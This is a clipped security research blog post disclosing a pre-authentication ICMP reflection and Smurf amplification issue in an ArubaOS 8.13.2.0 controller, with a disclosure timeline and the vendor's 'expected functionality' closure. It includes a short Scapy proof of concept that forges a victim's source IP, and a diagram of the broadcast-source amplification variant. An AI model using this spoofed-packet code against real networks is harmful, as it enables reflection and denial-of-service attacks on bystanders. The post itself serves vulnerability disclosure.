---
title: "ArubaOS 8.13.2.0 Smurf Amplification & ICMP Reflection: Pre-Auth uRPF Missing + Broadcast Reply | HPE Bugcrowd N/A | Netacoding | Cybersecurity, Assembly & Network Research"
source: https://netacoding.com/posts/smurf-reflection/
source_host: netacoding.com
clip_date: 2026-10-01T10:21:03+08:00
trace_id: 4b0b1c79-766b-42f7-bccd-fa2f2c20a7be
content_hash: 256793833994794861da9240e15b8a5c3a7d9a75afc0a739f81df802fe176795
status: synced
tags:
  - 漏洞分析
  - 协议分析
series: null
feed_source: Netacoding·协议/逆向
ai_summary: ArubaOS 8.13.2.0 控制器未做 ICMP 源 IP 校验（uRPF/BCP38），可被伪造源地址触发 Echo Reply 反射，甚至向广播源回包形成 Smurf 放大；HPE Bugcrowd 以“预期网络功能”关闭且未修复。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3ec75244-d011-8198-97da-d29b8a458f96
ioc:
  cves: []
  cwes:
    - CWE-290
    - CWE-406
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> ArubaOS 8.13.2.0 控制器未做 ICMP 源 IP 校验（uRPF/BCP38），可被伪造源地址触发 Echo Reply 反射，甚至向广播源回包形成 Smurf 放大；HPE Bugcrowd 以“预期网络功能”关闭且未修复。
> 
> - **漏洞组成：** CWE-290（不校验 ICMP Echo Request 源 IP，不比对 MAC/IP 绑定、无反向路径过滤）+ CWE-406（源 IP 为子网广播 `192.168.56.255` 时回复至 `ff:ff:ff:ff:ff:ff`，命中全网段主机）。
> - **验证环境：** 三台物理机——攻击机 Parrot OS `192.168.56.103`、目标控制器 `192.168.56.50`、受害机 Windows `192.168.56.1`（全程被动、未发过任何 ICMP）。
> - **PoC：** Scapy 构造 Ether 源为攻击者 MAC、IP 源为受害机 IP 的 Echo Request，控制器 ARP 解析伪造源并把 Reply 投递给受害机；受害侧 pcap 抓到未请求的 `id=0xc101` Echo Reply，是核心证据。
> - **合规依据：** RFC 1122 §3.2.2.6 禁止对广播源回包、RFC 2827/BCP38 要求入向源过滤、CERT CA-1998-01 早已记录 Smurf；作者认为该问题不属“预期功能”。
> - **处置结果：** 2026-05-15 提交（附双机 pcap），2026-06-01 判为 N/A，RaR 补充 RFC 与受害侧抓包后仍无修复、无公告；CVSS 3.1 自评 7.4（AV:A/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H）。

**Submission ID:** 09e49fa1 — HPE Networking Product Public Program (Bugcrowd)  
**Status:** Closed as *“Not Applicable — expected network functionality”*  
**GitHub:** [github.com/JM00NJ/HPE-Aruba-AOS8-Vulnerabilities](https://github.com/JM00NJ/HPE-Aruba-AOS8-Vulnerabilities)

* * *

## Background

This writeup documents a pre-authentication ICMP reflection and Smurf amplification vulnerability confirmed with wire-level evidence from two physically separate machines in ArubaOS 8.13.2.0 LSR. Submitted May 15, 2026.

Triage closed it as “expected network functionality” despite two independent packet captures — one from the attacker, one from the victim — showing an unsolicited Echo Reply arriving at a host that sent zero ICMP requests.

* * *

## Target

| Field | Value |
| --- | --- |
| Product | HPE Aruba Networking Wireless — AOS-8 Controller |
| Version | ArubaOS 8.13.2.0 LSR (Build 95415) |
| Component | ICMP Echo handler — IP stack |
| Authentication | None required |
| CVSS v3.1 | 7.4 High — `AV:A/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H` |
| CWE | CWE-290 (No Source IP Validation), CWE-406 (Smurf Broadcast Reply) |

* * *

## Vulnerability Description

**Component 1 — No Source IP Validation (CWE-290)**

The controller does not validate incoming ICMP Echo Request source IPs against MAC/IP bindings or apply reverse path filtering (BCP38/uRPF per RFC 2827). A packet with attacker MAC but victim IP is accepted. The controller ARP-resolves the spoofed source and delivers the reply to the victim.

**Component 2 — Broadcast Source Reply (CWE-406)**

ICMP Echo Request with Source IP `192.168.56.255` (subnet broadcast) causes the controller to reply to `ff:ff:ff:ff:ff:ff`, delivering the reply to every host on the L2 segment. Classic Smurf amplification — documented in CERT Advisory CA-1998-01.

* * *

## Lab Setup

```
192.168.56.103  Parrot OS  — Attacker
192.168.56.50   ArubaOS    — Target controller
192.168.56.1    Windows    — Victim (passive, never sent ICMP)
```

* * *

## Proof of Concept

```python
from scapy.all import *

pkt = Ether(src="08:00:27:cc:05:43") / \
      IP(src="192.168.56.1", dst="192.168.56.50") / \
      ICMP(type=8, code=0, id=0xc101)

sendp(pkt, iface="eth0", verbose=0)
```

**Victim PCAP — Frame 1:**

```
192.168.56.50 → 192.168.56.1  ICMP Echo Reply  id=0xc101
```

The victim received an unsolicited reply. It never sent any ICMP request.

**Smurf variant:**

```
Attacker → src=192.168.56.255 → Controller → dst=ff:ff:ff:ff:ff:ff → ALL hosts
```

* * *

## Evidence

| File | Machine | Content |
| --- | --- | --- |
| `parrot_smurf-chain.pcapng` | Attacker | Spoofed request + controller ARP + reply |
| `windows_smurf-chain.pcapng` | Victim | **Unsolicited Echo Reply received** |

The victim-side capture is the primary evidence. A machine that sends zero ICMP requests received an Echo Reply from the controller.

* * *

## RFC References

**RFC 1122 §3.2.2.6**— broadcast ICMP source should not generate a reply.  
**RFC 2827 / BCP38**— network ingress filtering against IP source spoofing.  
**CERT Advisory CA-1998-01**— Smurf IP DoS, documented 1998.

The Smurf attack is 28 years old. Every major vendor mitigated it. An enterprise controller shipping in 2026 without broadcast source rejection is not “expected functionality.”

* * *

## Timeline

| Date | Event |
| --- | --- |
| 15 May 2026 | Submission created, two-machine pcap attached |
| 01 Jun 2026 | **N/A — “expected network functionality”** |
| 01 Jun 2026 | RaR submitted — RFC 1122, CERT CA-1998-01, victim pcap cited |

* * *

## Disclosure Note

The program has classified this as a non-vulnerability. No fix issued, no advisory published. This writeup is published for independent community evaluation.

*Vesqer / JM00NJ — [netacoding.com](https://netacoding.com/)*

**MITRE ATT&CK:** [T1498.002](https://attack.mitre.org/techniques/T1498/002/) · [T1562.004](https://attack.mitre.org/techniques/T1562/004/)

Support this research

If this post saved you time or sparked an idea, consider sponsoring independent security research.

[♥ Sponsor on GitHub](https://github.com/sponsors/JM00NJ)

## Related

-   [Ghost Leak — Pre-Auth Buffer Over-read via TTL=0 + IP Total Length in ArubaOS 8.13.2.0](https://netacoding.com/posts/ghost-leak/)
-   [Pre-Authentication XXE → OOB SSRF in ArubaOS 8.13.2.0 (Port 32000)](https://netacoding.com/posts/xxe-ssrf/)
-   [Smurf Amplification in 2026: Pre-Auth ICMP Reflection via L2 Broadcast](https://netacoding.com/posts/smurf-amplification/)
